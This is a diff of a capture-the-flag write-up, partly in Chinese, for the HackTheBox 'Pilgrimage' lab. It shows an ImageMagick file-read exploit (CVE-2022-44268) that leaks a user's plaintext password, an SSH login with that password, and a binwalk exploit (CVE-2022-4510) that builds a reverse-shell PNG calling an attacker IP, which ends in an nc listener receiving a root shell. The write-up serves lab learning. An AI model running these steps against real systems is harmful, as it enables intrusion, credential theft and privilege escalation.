@@ -6,11 +6,6 @@ disqus: hackmd
 HackTheBox: Pilgrimage
 ===
 
-
-## Table of Contents
-
-[TOC]
-
 ## Topic
 
 ### Lab
@@ -237,44 +232,44 @@ https://github.com/kljunowsky/CVE-2022-44268
 > python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6538d99eec52a.png > sqlite.sql
 
 > cat sqlite.sql| xxd -r -p - > sqlite.dump
+```
+sqlite3 sqlite.dump
 
->  sqlite3 sqlite.dump
-
-> sqlite> .dump
+sqlite> .dump
 PRAGMA foreign_keys=OFF;
 BEGIN TRANSACTION;
 CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
 CREATE INTO users VALUES('emily','abigchonkyboi123');
 CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
 COMMIT;
-
+```
 **GET emily password: abigchonkyboi123**
 
 ### 5. SSH connect
-> ssh emily@10.10.11.219
+```
+ssh emily@10.10.11.219
 
-> emily@pilgrimage:~$ ls
+emily@pilgrimage:~$ ls
 binwalk_exploit.png  user.txt
 emily@pilgrimage:~$ cat user.txt 
-8faf751881d5a33888161dcb1c3ed543
-
+```
 ![](https://hackmd.io/_uploads/SJMQKwIGa.png)
-### 6. GET USER FLAG
-> **FLAG: 8faf751881d5a33888161dcb1c3ed543**
+### ✅ Get User Flag
+> 在 `/home/emily`找到 User flag
 
-### 7. Privilege Escalation
+## Privilege Escalation
 > ls -al
 
 ![](https://hackmd.io/_uploads/rJ1Z5D8f6.png)
-> sudo -l
+### 6. sudo -l
 
-![](https://hackmd.io/_uploads/rkL_cwIza.png)
+![](https://hackmd.io/_uploads/rkL_cwIza.png)\
 (不可行)
 
-### 8. Binwalk 遠端程式碼: CVE-2022-4510
-#### 8.1 [Binwalk 功能](https://cloud.tencent.com/developer/article/1515285):
+### 7. Binwalk 遠端程式碼: CVE-2022-4510
+#### 7.1 [Binwalk 功能](https://cloud.tencent.com/developer/article/1515285):
 Binwalk是一款快速、易用，用於分析，逆向工程和提取韌體映像的工具。簡單易用，完全自動化腳本，並透過自訂簽名，提取規則和插件模組，還重要一點的是可以輕鬆擴展。在CTF的MISC類題型和IOT安全的韌體解包分析中廣泛應用，可以大幅提高效率。該工具對linux支援較好，對於windows功能支援較差。
-##### 8.1.1 /usr/local/bin/binwalk 使用 Binwalk
+##### 7.1.1 /usr/local/bin/binwalk 使用 Binwalk
 ```
 emily@pilgrimage:/usr/sbin$ cat malwarescan.sh 
 #!/bin/bash
@@ -293,25 +288,25 @@ blacklist=("Executable script" "Microsoft executable")
 done
 ```
 
-##### 8.1.2 Check binwalk version
+##### 7.1.2 Check binwalk version
 > binwalk -h
 
 ![](https://hackmd.io/_uploads/BJ7q9_Lz6.png)
 > Binwalk v2.3.2
 
-##### 8.1.3 Vulnerable CVE-2022-4510
-> git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
+##### 7.1.3 Vulnerable CVE-2022-4510
+> git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath\
 > python3 exploit_generator.py reverse CTF.png 10.10.14.77 8520
 
 ![](https://hackmd.io/_uploads/BJev-XFLGp.png)
 > binwalk_exploit.png  CTF.png   LICENSE  README.md  walkingpath.py
 
-##### 8.1.4 Create ncat listening port
+##### 7.1.4 Create ncat listening port
 > nc -nvlp 8520
 
 ![](https://hackmd.io/_uploads/SknWXg3zp.png)
 
-##### 8.1.5 Copy png to SSH
+##### 7.1.5 Copy png to SSH
 > scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shurnk
 
 ![](https://hackmd.io/_uploads/SJgELtUfa.png)
@@ -320,14 +315,15 @@ done
 > scp binwalk_exploit.png emily@10.10.11.219:/home/emily
 
 ![](https://hackmd.io/_uploads/HJlJgzgnGa.png)
-> emily@pilgrimage:~$ ps -aux
-> emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
-> emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
-
-#### 8.2 Connecting ncat
+```
+emily@pilgrimage:~$ ps -aux
+emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
+emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+```
+#### 7.2 Connecting ncat
 ![](https://hackmd.io/_uploads/HkG57l2Mp.png)
-
-> chw@Ubuntu22:~$ nc -nvlp 8520
+```
+chw@Ubuntu22:~$ nc -nvlp 8520
 Listening on 0.0.0.0 8520
 Connection received on 10.10.11.219 48536
 #id
@@ -339,11 +335,8 @@ root
 quarantine
 reset.sh
 root.txt
-#cat root.txt
-7bf8248e0de3a58ea60325e30e8ef9a8
-
-### 9. GET ROOT FLAG
-> **FLAG: 7bf8248e0de3a58ea60325e30e8ef9a8**
+```
+### ✅ Get Root FLAG
 
 
 ###### tags: `Web` `CTF` `dirsearch` `GitTool` `ImageMagick` `Binwalk` `ncat`
